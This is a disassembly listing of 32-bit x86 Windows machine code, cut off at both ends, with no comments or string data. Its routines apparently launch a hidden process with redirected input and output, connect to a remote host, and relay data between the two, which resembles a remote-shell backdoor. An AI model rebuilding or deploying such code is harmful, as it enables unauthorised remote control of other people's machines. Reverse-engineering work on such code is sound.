13141e9f:	a3 f0 27 15 13       	mov    %eax,0x131527f0
13141ea4:	ff 35 f4 27 15 13    	pushl  0x131527f4
13141eaa:	ff 15 d8 36 15 13    	call   *0x131536d8
13141eb0:	c3                   	ret    
13141eb1:	a1 f0 27 15 13       	mov    0x131527f0,%eax
13141eb6:	c3                   	ret    
13141eb7:	b8 a8 26 15 13       	mov    $0x131526a8,%eax
13141ebc:	c3                   	ret    
13141ebd:	55                   	push   %ebp
13141ebe:	8b ec                	mov    %esp,%ebp
13141ec0:	81 ec 00 01 00 00    	sub    $0x100,%esp
13141ec6:	56                   	push   %esi
13141ec7:	8b 75 08             	mov    0x8(%ebp),%esi
13141eca:	8d 45 08             	lea    0x8(%ebp),%eax
13141ecd:	6a 00                	push   $0x0
13141ecf:	50                   	push   %eax
13141ed0:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13141ed6:	68 00 01 00 00       	push   $0x100
13141edb:	50                   	push   %eax
13141edc:	ff 76 0c             	pushl  0xc(%esi)
13141edf:	ff 15 54 35 15 13    	call   *0x13153554
13141ee5:	85 c0                	test   %eax,%eax
13141ee7:	74 18                	je     0x13141f01
13141ee9:	6a 00                	push   $0x0
13141eeb:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13141ef1:	ff 75 08             	pushl  0x8(%ebp)
13141ef4:	50                   	push   %eax
13141ef5:	ff 36                	pushl  (%esi)
13141ef7:	ff 15 68 37 15 13    	call   *0x13153768
13141efd:	85 c0                	test   %eax,%eax
13141eff:	75 c9                	jne    0x13141eca
13141f01:	33 c0                	xor    %eax,%eax
13141f03:	5e                   	pop    %esi
13141f04:	c9                   	leave  
13141f05:	c2 04 00             	ret    $0x4
13141f08:	55                   	push   %ebp
13141f09:	8b ec                	mov    %esp,%ebp
13141f0b:	81 ec 6c 01 00 00    	sub    $0x16c,%esp
13141f11:	8b 45 08             	mov    0x8(%ebp),%eax
13141f14:	56                   	push   %esi
13141f15:	33 f6                	xor    %esi,%esi
13141f17:	a3 f8 24 15 13       	mov    %eax,0x131524f8
13141f1c:	57                   	push   %edi
13141f1d:	8d 45 dc             	lea    -0x24(%ebp),%eax
13141f20:	56                   	push   %esi
13141f21:	50                   	push   %eax
13141f22:	68 00 25 15 13       	push   $0x13152500
13141f27:	68 fc 24 15 13       	push   $0x131524fc
13141f2c:	c7 45 dc 0c 00 00 00 	movl   $0xc,-0x24(%ebp)
13141f33:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
13141f3a:	89 75 e0             	mov    %esi,-0x20(%ebp)
13141f3d:	89 35 10 25 15 13    	mov    %esi,0x13152510
13141f43:	ff 15 a8 36 15 13    	call   *0x131536a8
13141f49:	8d 45 dc             	lea    -0x24(%ebp),%eax
13141f4c:	56                   	push   %esi
13141f4d:	50                   	push   %eax
13141f4e:	68 08 25 15 13       	push   $0x13152508
13141f53:	68 04 25 15 13       	push   $0x13152504
13141f58:	ff 15 a8 36 15 13    	call   *0x131536a8
13141f5e:	6a 44                	push   $0x44
13141f60:	8d 45 94             	lea    -0x6c(%ebp),%eax
13141f63:	5f                   	pop    %edi
13141f64:	57                   	push   %edi
13141f65:	56                   	push   %esi
13141f66:	50                   	push   %eax
13141f67:	e8 b6 06 00 00       	call   0x13142622
13141f6c:	a1 fc 24 15 13       	mov    0x131524fc,%eax
13141f71:	83 c4 0c             	add    $0xc,%esp
13141f74:	89 45 cc             	mov    %eax,-0x34(%ebp)
13141f77:	a1 08 25 15 13       	mov    0x13152508,%eax
13141f7c:	89 45 d0             	mov    %eax,-0x30(%ebp)
13141f7f:	89 45 d4             	mov    %eax,-0x2c(%ebp)
13141f82:	8d 45 e8             	lea    -0x18(%ebp),%eax
13141f85:	89 7d 94             	mov    %edi,-0x6c(%ebp)
13141f88:	50                   	push   %eax
13141f89:	8d 45 94             	lea    -0x6c(%ebp),%eax
13141f8c:	50                   	push   %eax
13141f8d:	56                   	push   %esi
13141f8e:	56                   	push   %esi
13141f8f:	56                   	push   %esi
13141f90:	6a 01                	push   $0x1
13141f92:	56                   	push   %esi
13141f93:	56                   	push   %esi
13141f94:	68 ac d0 14 13       	push   $0x1314d0ac
13141f99:	56                   	push   %esi
13141f9a:	c7 45 c0 01 01 00 00 	movl   $0x101,-0x40(%ebp)
13141fa1:	66 89 75 c4          	mov    %si,-0x3c(%ebp)
13141fa5:	ff 15 2c 37 15 13    	call   *0x1315372c
13141fab:	85 c0                	test   %eax,%eax
13141fad:	75 08                	jne    0x13141fb7
13141faf:	6a 02                	push   $0x2
13141fb1:	58                   	pop    %eax
13141fb2:	e9 fe 00 00 00       	jmp    0x131420b5
13141fb7:	6a ff                	push   $0xffffffff
13141fb9:	ff 75 e8             	pushl  -0x18(%ebp)
13141fbc:	ff 15 a8 33 15 13    	call   *0x131533a8
13141fc2:	8b 45 e8             	mov    -0x18(%ebp),%eax
13141fc5:	bf f8 24 15 13       	mov    $0x131524f8,%edi
13141fca:	a3 0c 25 15 13       	mov    %eax,0x1315250c
13141fcf:	8d 45 f8             	lea    -0x8(%ebp),%eax
13141fd2:	50                   	push   %eax
13141fd3:	56                   	push   %esi
13141fd4:	57                   	push   %edi
13141fd5:	68 6c 15 14 13       	push   $0x1314156c
13141fda:	56                   	push   %esi
13141fdb:	56                   	push   %esi
13141fdc:	ff 15 30 37 15 13    	call   *0x13153730
13141fe2:	89 45 f8             	mov    %eax,-0x8(%ebp)
13141fe5:	8d 45 fc             	lea    -0x4(%ebp),%eax
13141fe8:	50                   	push   %eax
13141fe9:	56                   	push   %esi
13141fea:	57                   	push   %edi
13141feb:	68 bd 1e 14 13       	push   $0x13141ebd
13141ff0:	56                   	push   %esi
13141ff1:	56                   	push   %esi
13141ff2:	ff 15 30 37 15 13    	call   *0x13153730
13141ff8:	89 45 fc             	mov    %eax,-0x4(%ebp)
13141ffb:	39 35 14 25 15 13    	cmp    %esi,0x13152514
13142001:	74 3c                	je     0x1314203f
13142003:	56                   	push   %esi
13142004:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
1314200a:	68 00 01 00 00       	push   $0x100
1314200f:	50                   	push   %eax
13142010:	ff 75 08             	pushl  0x8(%ebp)
13142013:	ff 15 4c 37 15 13    	call   *0x1315374c
13142019:	3b c6                	cmp    %esi,%eax
1314201b:	74 22                	je     0x1314203f
1314201d:	83 f8 ff             	cmp    $0xffffffff,%eax
13142020:	74 1d                	je     0x1314203f
13142022:	8d 4d d8             	lea    -0x28(%ebp),%ecx
13142025:	56                   	push   %esi
13142026:	51                   	push   %ecx
13142027:	50                   	push   %eax
13142028:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
1314202e:	50                   	push   %eax
1314202f:	ff 35 00 25 15 13    	pushl  0x13152500
13142035:	ff 15 b4 33 15 13    	call   *0x131533b4
1314203b:	85 c0                	test   %eax,%eax
1314203d:	75 bc                	jne    0x13141ffb
1314203f:	68 f4 01 00 00       	push   $0x1f4
13142044:	89 35 14 25 15 13    	mov    %esi,0x13152514
1314204a:	ff 15 fc 36 15 13    	call   *0x131536fc
13142050:	57                   	push   %edi
13142051:	e8 d6 f4 ff ff       	call   0x1314152c
13142056:	59                   	pop    %ecx
13142057:	56                   	push   %esi
13142058:	ff 75 f8             	pushl  -0x8(%ebp)
1314205b:	ff 15 d8 36 15 13    	call   *0x131536d8
13142061:	56                   	push   %esi
13142062:	ff 75 fc             	pushl  -0x4(%ebp)
13142065:	ff 15 d8 36 15 13    	call   *0x131536d8
1314206b:	ff 75 f8             	pushl  -0x8(%ebp)
1314206e:	ff 15 80 33 15 13    	call   *0x13153380
13142074:	ff 75 fc             	pushl  -0x4(%ebp)
13142077:	ff 15 80 33 15 13    	call   *0x13153380
1314207d:	56                   	push   %esi
1314207e:	ff 75 e8             	pushl  -0x18(%ebp)
13142081:	ff 15 f8 33 15 13    	call   *0x131533f8
13142087:	56                   	push   %esi
13142088:	ff 75 ec             	pushl  -0x14(%ebp)
1314208b:	ff 15 d8 36 15 13    	call   *0x131536d8
13142091:	ff 75 e8             	pushl  -0x18(%ebp)
13142094:	ff 15 80 33 15 13    	call   *0x13153380
1314209a:	ff 75 ec             	pushl  -0x14(%ebp)
1314209d:	ff 15 80 33 15 13    	call   *0x13153380
131420a3:	ff 75 08             	pushl  0x8(%ebp)
131420a6:	ff 15 e4 36 15 13    	call   *0x131536e4
131420ac:	56                   	push   %esi
131420ad:	ff 15 ec 36 15 13    	call   *0x131536ec
131420b3:	33 c0                	xor    %eax,%eax
131420b5:	5f                   	pop    %edi
131420b6:	5e                   	pop    %esi
131420b7:	c9                   	leave  
131420b8:	c2 04 00             	ret    $0x4
131420bb:	55                   	push   %ebp
131420bc:	8b ec                	mov    %esp,%ebp
131420be:	81 ec 9c 07 00 00    	sub    $0x79c,%esp
131420c4:	53                   	push   %ebx
131420c5:	56                   	push   %esi
131420c6:	57                   	push   %edi
131420c7:	8d 85 64 f9 ff ff    	lea    -0x69c(%ebp),%eax
131420cd:	33 f6                	xor    %esi,%esi
131420cf:	68 1c 25 15 13       	push   $0x1315251c
131420d4:	50                   	push   %eax
131420d5:	89 75 fc             	mov    %esi,-0x4(%ebp)
131420d8:	ff 15 98 39 15 13    	call   *0x13153998
131420de:	59                   	pop    %ecx
131420df:	59                   	pop    %ecx
131420e0:	56                   	push   %esi
131420e1:	6a 01                	push   $0x1
131420e3:	6a 02                	push   $0x2
131420e5:	ff 15 64 35 15 13    	call   *0x13153564
131420eb:	83 f8 ff             	cmp    $0xffffffff,%eax
131420ee:	a3 f4 24 15 13       	mov    %eax,0x131524f4
131420f3:	75 4f                	jne    0x13142144
131420f5:	8d 85 64 fa ff ff    	lea    -0x59c(%ebp),%eax
131420fb:	68 bc d8 14 13       	push   $0x1314d8bc
13142100:	50                   	push   %eax
13142101:	89 35 14 25 15 13    	mov    %esi,0x13152514
13142107:	ff 15 98 39 15 13    	call   *0x13153998
1314210d:	39 35 1c 26 15 13    	cmp    %esi,0x1315261c
13142113:	59                   	pop    %ecx
13142114:	59                   	pop    %ecx
13142115:	75 26                	jne    0x1314213d
13142117:	ff 35 20 26 15 13    	pushl  0x13152620
1314211d:	b9 81 01 00 00       	mov    $0x181,%ecx
13142122:	8d b5 64 f8 ff ff    	lea    -0x79c(%ebp),%esi
13142128:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314212e:	8b fc                	mov    %esp,%edi
13142130:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13142132:	e8 b5 69 00 00       	call   0x13148aec
13142137:	81 c4 08 06 00 00    	add    $0x608,%esp
1314213d:	6a 13                	push   $0x13
1314213f:	e9 8e 03 00 00       	jmp    0x131424d2
13142144:	66 a1 f0 24 15 13    	mov    0x131524f0,%ax
1314214a:	66 c7 45 ec 02 00    	movw   $0x2,-0x14(%ebp)
13142150:	50                   	push   %eax
13142151:	ff 15 8c 37 15 13    	call   *0x1315378c
13142157:	bb 30 24 15 13       	mov    $0x13152430,%ebx
1314215c:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
13142160:	53                   	push   %ebx
13142161:	ff 15 ac 39 15 13    	call   *0x131539ac
13142167:	83 f8 ff             	cmp    $0xffffffff,%eax
1314216a:	53                   	push   %ebx
1314216b:	75 07                	jne    0x13142174
1314216d:	e8 b4 32 00 00       	call   0x13145426
13142172:	59                   	pop    %ecx
13142173:	50                   	push   %eax
13142174:	ff 15 ac 39 15 13    	call   *0x131539ac
1314217a:	89 45 f0             	mov    %eax,-0x10(%ebp)
1314217d:	8d 45 ec             	lea    -0x14(%ebp),%eax
13142180:	6a 10                	push   $0x10
13142182:	50                   	push   %eax
13142183:	ff 35 f4 24 15 13    	pushl  0x131524f4
13142189:	ff 15 34 37 15 13    	call   *0x13153734
1314218f:	83 f8 ff             	cmp    $0xffffffff,%eax
13142192:	75 5b                	jne    0x131421ef
13142194:	ff 35 f4 24 15 13    	pushl  0x131524f4
1314219a:	89 35 14 25 15 13    	mov    %esi,0x13152514
131421a0:	ff 15 e4 36 15 13    	call   *0x131536e4
131421a6:	8d 85 64 fa ff ff    	lea    -0x59c(%ebp),%eax
131421ac:	68 9c d8 14 13       	push   $0x1314d89c
131421b1:	50                   	push   %eax
131421b2:	ff 15 98 39 15 13    	call   *0x13153998
131421b8:	39 35 1c 26 15 13    	cmp    %esi,0x1315261c
131421be:	59                   	pop    %ecx
131421bf:	59                   	pop    %ecx
131421c0:	75 26                	jne    0x131421e8
131421c2:	ff 35 20 26 15 13    	pushl  0x13152620
131421c8:	b9 81 01 00 00       	mov    $0x181,%ecx
131421cd:	8d b5 64 f8 ff ff    	lea    -0x79c(%ebp),%esi
131421d3:	81 ec 04 06 00 00    	sub    $0x604,%esp
131421d9:	8b fc                	mov    %esp,%edi
131421db:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131421dd:	e8 0a 69 00 00       	call   0x13148aec
131421e2:	81 c4 08 06 00 00    	add    $0x608,%esp
131421e8:	6a 02                	push   $0x2
131421ea:	e9 e3 02 00 00       	jmp    0x131424d2
131421ef:	68 b0 24 15 13       	push   $0x131524b0
131421f4:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
131421fa:	68 94 d8 14 13       	push   $0x1314d894
131421ff:	50                   	push   %eax
13142200:	ff 15 98 39 15 13    	call   *0x13153998
13142206:	83 c4 0c             	add    $0xc,%esp
13142209:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
1314220f:	56                   	push   %esi
13142210:	50                   	push   %eax
13142211:	e8 e7 04 00 00       	call   0x131426fd
13142216:	59                   	pop    %ecx
13142217:	50                   	push   %eax
13142218:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
1314221e:	50                   	push   %eax
1314221f:	ff 35 f4 24 15 13    	pushl  0x131524f4
13142225:	ff 15 68 37 15 13    	call   *0x13153768
1314222b:	8b 45 fc             	mov    -0x4(%ebp),%eax
1314222e:	83 f8 40             	cmp    $0x40,%eax
13142231:	74 21                	je     0x13142254
13142233:	8d bc 05 28 ff ff ff 	lea    -0xd8(%ebp,%eax,1),%edi
1314223a:	56                   	push   %esi
1314223b:	6a 01                	push   $0x1
1314223d:	57                   	push   %edi
1314223e:	ff 35 f4 24 15 13    	pushl  0x131524f4
13142244:	ff 15 4c 37 15 13    	call   *0x1315374c
1314224a:	80 3f 0a             	cmpb   $0xa,(%edi)
1314224d:	74 05                	je     0x13142254
1314224f:	ff 45 fc             	incl   -0x4(%ebp)
13142252:	eb d7                	jmp    0x1314222b
13142254:	6a 03                	push   $0x3
13142256:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
1314225c:	68 90 d8 14 13       	push   $0x1314d890
13142261:	50                   	push   %eax
13142262:	e8 2a 04 00 00       	call   0x13142691
13142267:	83 c4 0c             	add    $0xc,%esp
1314226a:	85 c0                	test   %eax,%eax
1314226c:	74 57                	je     0x131422c5
1314226e:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
13142274:	89 35 14 25 15 13    	mov    %esi,0x13152514
1314227a:	50                   	push   %eax
1314227b:	8d 85 64 fa ff ff    	lea    -0x59c(%ebp),%eax
13142281:	68 5c d8 14 13       	push   $0x1314d85c
13142286:	50                   	push   %eax
13142287:	ff 15 98 39 15 13    	call   *0x13153998
1314228d:	83 c4 0c             	add    $0xc,%esp
13142290:	39 35 1c 26 15 13    	cmp    %esi,0x1315261c
13142296:	75 26                	jne    0x131422be
13142298:	ff 35 20 26 15 13    	pushl  0x13152620
1314229e:	b9 81 01 00 00       	mov    $0x181,%ecx
131422a3:	8d b5 64 f8 ff ff    	lea    -0x79c(%ebp),%esi
131422a9:	81 ec 04 06 00 00    	sub    $0x604,%esp
131422af:	8b fc                	mov    %esp,%edi
131422b1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131422b3:	e8 34 68 00 00       	call   0x13148aec
131422b8:	81 c4 08 06 00 00    	add    $0x608,%esp
131422be:	6a 16                	push   $0x16
131422c0:	e9 90 01 00 00       	jmp    0x13142455
131422c5:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
131422cb:	68 4c d8 14 13       	push   $0x1314d84c
131422d0:	50                   	push   %eax
131422d1:	ff 15 98 39 15 13    	call   *0x13153998
131422d7:	59                   	pop    %ecx
131422d8:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
131422de:	59                   	pop    %ecx
131422df:	56                   	push   %esi
131422e0:	50                   	push   %eax
131422e1:	e8 17 04 00 00       	call   0x131426fd
131422e6:	59                   	pop    %ecx
131422e7:	50                   	push   %eax
131422e8:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
131422ee:	50                   	push   %eax
131422ef:	ff 35 f4 24 15 13    	pushl  0x131524f4
131422f5:	ff 15 68 37 15 13    	call   *0x13153768
131422fb:	56                   	push   %esi
131422fc:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
13142302:	6a 40                	push   $0x40
13142304:	50                   	push   %eax
13142305:	ff 35 f4 24 15 13    	pushl  0x131524f4
1314230b:	ff 15 4c 37 15 13    	call   *0x1315374c
13142311:	83 f8 ff             	cmp    $0xffffffff,%eax
13142314:	75 4f                	jne    0x13142365
13142316:	8d 85 64 fa ff ff    	lea    -0x59c(%ebp),%eax
1314231c:	68 28 d8 14 13       	push   $0x1314d828
13142321:	50                   	push   %eax
13142322:	89 35 14 25 15 13    	mov    %esi,0x13152514
13142328:	ff 15 98 39 15 13    	call   *0x13153998
1314232e:	39 35 1c 26 15 13    	cmp    %esi,0x1315261c
13142334:	59                   	pop    %ecx
13142335:	59                   	pop    %ecx
13142336:	75 26                	jne    0x1314235e
13142338:	ff 35 20 26 15 13    	pushl  0x13152620
1314233e:	b9 81 01 00 00       	mov    $0x181,%ecx
13142343:	8d b5 64 f8 ff ff    	lea    -0x79c(%ebp),%esi
13142349:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314234f:	8b fc                	mov    %esp,%edi
13142351:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13142353:	e8 94 67 00 00       	call   0x13148aec
13142358:	81 c4 08 06 00 00    	add    $0x608,%esp
1314235e:	6a 05                	push   $0x5
13142360:	e9 f0 00 00 00       	jmp    0x13142455
13142365:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
1314236b:	50                   	push   %eax
1314236c:	e8 e8 30 00 00       	call   0x13145459
13142371:	68 80 00 00 00       	push   $0x80
13142376:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
1314237c:	56                   	push   %esi
1314237d:	50                   	push   %eax
1314237e:	e8 9f 02 00 00       	call   0x13142622
13142383:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
13142389:	6a 2b                	push   $0x2b
1314238b:	50                   	push   %eax
1314238c:	68 e8 d4 14 13       	push   $0x1314d4e8
13142391:	e8 e7 38 00 00       	call   0x13145c7d
13142396:	83 c4 1c             	add    $0x1c,%esp
13142399:	39 35 10 24 15 13    	cmp    %esi,0x13152410
1314239f:	74 17                	je     0x131423b8
131423a1:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
131423a7:	68 24 d8 14 13       	push   $0x1314d824
131423ac:	50                   	push   %eax
131423ad:	53                   	push   %ebx
131423ae:	e8 b3 35 00 00       	call   0x13145966
131423b3:	83 c4 0c             	add    $0xc,%esp
131423b6:	eb 06                	jmp    0x131423be
131423b8:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
131423be:	50                   	push   %eax
131423bf:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
131423c5:	50                   	push   %eax
131423c6:	e8 61 03 00 00       	call   0x1314272c
131423cb:	59                   	pop    %ecx
131423cc:	85 c0                	test   %eax,%eax
131423ce:	59                   	pop    %ecx
131423cf:	0f 84 94 00 00 00    	je     0x13142469
131423d5:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
131423db:	68 08 d8 14 13       	push   $0x1314d808
131423e0:	50                   	push   %eax
131423e1:	89 35 14 25 15 13    	mov    %esi,0x13152514
131423e7:	ff 15 98 39 15 13    	call   *0x13153998
131423ed:	59                   	pop    %ecx
131423ee:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
131423f4:	59                   	pop    %ecx
131423f5:	56                   	push   %esi
131423f6:	50                   	push   %eax
131423f7:	e8 01 03 00 00       	call   0x131426fd
131423fc:	59                   	pop    %ecx
131423fd:	50                   	push   %eax
131423fe:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
13142404:	50                   	push   %eax
13142405:	ff 35 f4 24 15 13    	pushl  0x131524f4
1314240b:	ff 15 68 37 15 13    	call   *0x13153768
13142411:	8d 85 64 fa ff ff    	lea    -0x59c(%ebp),%eax
13142417:	68 e8 d7 14 13       	push   $0x1314d7e8
1314241c:	50                   	push   %eax
1314241d:	ff 15 98 39 15 13    	call   *0x13153998
13142423:	39 35 1c 26 15 13    	cmp    %esi,0x1315261c
13142429:	59                   	pop    %ecx
1314242a:	59                   	pop    %ecx
1314242b:	75 26                	jne    0x13142453
1314242d:	ff 35 20 26 15 13    	pushl  0x13152620
13142433:	b9 81 01 00 00       	mov    $0x181,%ecx
13142438:	8d b5 64 f8 ff ff    	lea    -0x79c(%ebp),%esi
1314243e:	81 ec 04 06 00 00    	sub    $0x604,%esp
13142444:	8b fc                	mov    %esp,%edi
13142446:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13142448:	e8 9f 66 00 00       	call   0x13148aec
1314244d:	81 c4 08 06 00 00    	add    $0x608,%esp
13142453:	6a 06                	push   $0x6
13142455:	5e                   	pop    %esi
13142456:	ff 35 f4 24 15 13    	pushl  0x131524f4
1314245c:	ff 15 e4 36 15 13    	call   *0x131536e4
13142462:	8b c6                	mov    %esi,%eax
13142464:	e9 cf 00 00 00       	jmp    0x13142538
13142469:	53                   	push   %ebx
1314246a:	8d 85 64 fa ff ff    	lea    -0x59c(%ebp),%eax
13142470:	68 bc d7 14 13       	push   $0x1314d7bc
13142475:	50                   	push   %eax
13142476:	ff 15 98 39 15 13    	call   *0x13153998
1314247c:	83 c4 0c             	add    $0xc,%esp
1314247f:	39 35 1c 26 15 13    	cmp    %esi,0x1315261c
13142485:	75 28                	jne    0x131424af
13142487:	ff 35 20 26 15 13    	pushl  0x13152620
1314248d:	b9 81 01 00 00       	mov    $0x181,%ecx
13142492:	8d b5 64 f8 ff ff    	lea    -0x79c(%ebp),%esi
13142498:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314249e:	8b fc                	mov    %esp,%edi
131424a0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131424a2:	e8 45 66 00 00       	call   0x13148aec
131424a7:	81 c4 08 06 00 00    	add    $0x608,%esp
131424ad:	33 f6                	xor    %esi,%esi
131424af:	8d 45 e8             	lea    -0x18(%ebp),%eax
131424b2:	50                   	push   %eax
131424b3:	56                   	push   %esi
131424b4:	ff 35 f4 24 15 13    	pushl  0x131524f4
131424ba:	68 08 1f 14 13       	push   $0x13141f08
131424bf:	56                   	push   %esi
131424c0:	56                   	push   %esi
131424c1:	ff 15 30 37 15 13    	call   *0x13153730
131424c7:	3b c6                	cmp    %esi,%eax
131424c9:	a3 18 25 15 13       	mov    %eax,0x13152518
131424ce:	75 05                	jne    0x131424d5
131424d0:	6a 07                	push   $0x7
131424d2:	58                   	pop    %eax
131424d3:	eb 63                	jmp    0x13142538
131424d5:	6a ff                	push   $0xffffffff
131424d7:	50                   	push   %eax
131424d8:	ff 15 78 33 15 13    	call   *0x13153378
131424de:	53                   	push   %ebx
131424df:	8d 85 64 fa ff ff    	lea    -0x59c(%ebp),%eax
131424e5:	68 90 d7 14 13       	push   $0x1314d790
131424ea:	50                   	push   %eax
131424eb:	ff 15 98 39 15 13    	call   *0x13153998
131424f1:	83 c4 0c             	add    $0xc,%esp
131424f4:	39 35 1c 26 15 13    	cmp    %esi,0x1315261c
131424fa:	75 28                	jne    0x13142524
131424fc:	ff 35 20 26 15 13    	pushl  0x13152620
13142502:	b9 81 01 00 00       	mov    $0x181,%ecx
13142507:	8d b5 64 f8 ff ff    	lea    -0x79c(%ebp),%esi
1314250d:	81 ec 04 06 00 00    	sub    $0x604,%esp
13142513:	8b fc                	mov    %esp,%edi
13142515:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13142517:	e8 d0 65 00 00       	call   0x13148aec
1314251c:	81 c4 08 06 00 00    	add    $0x608,%esp
13142522:	33 f6                	xor    %esi,%esi
13142524:	ff 35 f4 24 15 13    	pushl  0x131524f4
1314252a:	ff 15 e4 36 15 13    	call   *0x131536e4
13142530:	89 35 14 25 15 13    	mov    %esi,0x13152514
13142536:	33 c0                	xor    %eax,%eax
13142538:	5f                   	pop    %edi
13142539:	5e                   	pop    %esi
1314253a:	5b                   	pop    %ebx
1314253b:	c9                   	leave  
1314253c:	c2 04 00             	ret    $0x4
1314253f:	55                   	push   %ebp
13142540:	8b ec                	mov    %esp,%ebp
13142542:	57                   	push   %edi
13142543:	33 ff                	xor    %edi,%edi
13142545:	39 3d 14 25 15 13    	cmp    %edi,0x13152514
1314254b:	74 05                	je     0x13142552
1314254d:	6a 02                	push   $0x2
1314254f:	58                   	pop    %eax
13142550:	eb 73                	jmp    0x131425c5
13142552:	a1 44 45 17 13       	mov    0x13174544,%eax
13142557:	56                   	push   %esi
13142558:	ff 75 10             	pushl  0x10(%ebp)
1314255b:	be 00 d1 14 13       	mov    $0x1314d100,%esi
13142560:	a3 1c 26 15 13       	mov    %eax,0x1315261c
13142565:	8b 45 18             	mov    0x18(%ebp),%eax
13142568:	56                   	push   %esi
13142569:	68 b0 24 15 13       	push   $0x131524b0
1314256e:	a3 20 26 15 13       	mov    %eax,0x13152620
13142573:	ff 15 98 39 15 13    	call   *0x13153998
13142579:	ff 75 14             	pushl  0x14(%ebp)
1314257c:	56                   	push   %esi
1314257d:	68 1c 25 15 13       	push   $0x1315251c
13142582:	ff 15 98 39 15 13    	call   *0x13153998
13142588:	ff 75 08             	pushl  0x8(%ebp)
1314258b:	56                   	push   %esi
1314258c:	68 30 24 15 13       	push   $0x13152430
13142591:	ff 15 98 39 15 13    	call   *0x13153998
13142597:	8b 45 0c             	mov    0xc(%ebp),%eax
1314259a:	83 c4 24             	add    $0x24,%esp
1314259d:	a3 f0 24 15 13       	mov    %eax,0x131524f0
131425a2:	8d 45 18             	lea    0x18(%ebp),%eax
131425a5:	50                   	push   %eax
131425a6:	57                   	push   %edi
131425a7:	57                   	push   %edi
131425a8:	68 bb 20 14 13       	push   $0x131420bb
131425ad:	57                   	push   %edi
131425ae:	57                   	push   %edi
131425af:	c7 05 14 25 15 13 01 	movl   $0x1,0x13152514
131425b6:	00 00 00 
131425b9:	ff 15 30 37 15 13    	call   *0x13153730
131425bf:	a3 18 25 15 13       	mov    %eax,0x13152518
131425c4:	5e                   	pop    %esi
131425c5:	5f                   	pop    %edi
131425c6:	5d                   	pop    %ebp
131425c7:	c3                   	ret    
131425c8:	51                   	push   %ecx
131425c9:	83 3d 14 25 15 13 00 	cmpl   $0x0,0x13152514
131425d0:	75 04                	jne    0x131425d6
131425d2:	6a 02                	push   $0x2
131425d4:	eb 3d                	jmp    0x13142613
131425d6:	8d 44 24 00          	lea    0x0(%esp),%eax
131425da:	6a 00                	push   $0x0
131425dc:	50                   	push   %eax
131425dd:	6a 05                	push   $0x5
131425df:	68 d8 d8 14 13       	push   $0x1314d8d8
131425e4:	ff 35 00 25 15 13    	pushl  0x13152500
131425ea:	ff 15 b4 33 15 13    	call   *0x131533b4
131425f0:	6a 00                	push   $0x0
131425f2:	ff 35 0c 25 15 13    	pushl  0x1315250c
131425f8:	ff 15 f8 33 15 13    	call   *0x131533f8
131425fe:	ff 35 f4 24 15 13    	pushl  0x131524f4
13142604:	83 25 14 25 15 13 00 	andl   $0x0,0x13152514
1314260b:	ff 15 e4 36 15 13    	call   *0x131536e4
13142611:	6a 01                	push   $0x1
13142613:	58                   	pop    %eax
13142614:	59                   	pop    %ecx
13142615:	c3                   	ret    
13142616:	a1 14 25 15 13       	mov    0x13152514,%eax
1314261b:	c3                   	ret    
1314261c:	b8 30 24 15 13       	mov    $0x13152430,%eax
13142621:	c3                   	ret    
13142622:	55                   	push   %ebp
13142623:	8b ec                	mov    %esp,%ebp
13142625:	56                   	push   %esi
13142626:	33 c9                	xor    %ecx,%ecx
13142628:	8b 75 08             	mov    0x8(%ebp),%esi
1314262b:	8a 45 0c             	mov    0xc(%ebp),%al
1314262e:	88 06                	mov    %al,(%esi)
13142630:	46                   	inc    %esi
13142631:	41                   	inc    %ecx
13142632:	3b 4d 10             	cmp    0x10(%ebp),%ecx
13142635:	75 f4                	jne    0x1314262b
13142637:	8b 45 08             	mov    0x8(%ebp),%eax
1314263a:	5e                   	pop    %esi
1314263b:	5d                   	pop    %ebp
1314263c:	c3                   	ret    
1314263d:	8b 44 24 04          	mov    0x4(%esp),%eax
13142641:	56                   	push   %esi
13142642:	8a 08                	mov    (%eax),%cl
13142644:	84 c9                	test   %cl,%cl
13142646:	74 23                	je     0x1314266b
13142648:	8b 54 24 0c          	mov    0xc(%esp),%edx
1314264c:	8b f0                	mov    %eax,%esi
1314264e:	8a 0a                	mov    (%edx),%cl
13142650:	84 c9                	test   %cl,%cl
13142652:	74 0b                	je     0x1314265f
13142654:	38 0e                	cmp    %cl,(%esi)
13142656:	75 07                	jne    0x1314265f
13142658:	46                   	inc    %esi
13142659:	42                   	inc    %edx
1314265a:	80 3e 00             	cmpb   $0x0,(%esi)
1314265d:	75 ef                	jne    0x1314264e
1314265f:	3b f2                	cmp    %edx,%esi
13142661:	74 0a                	je     0x1314266d
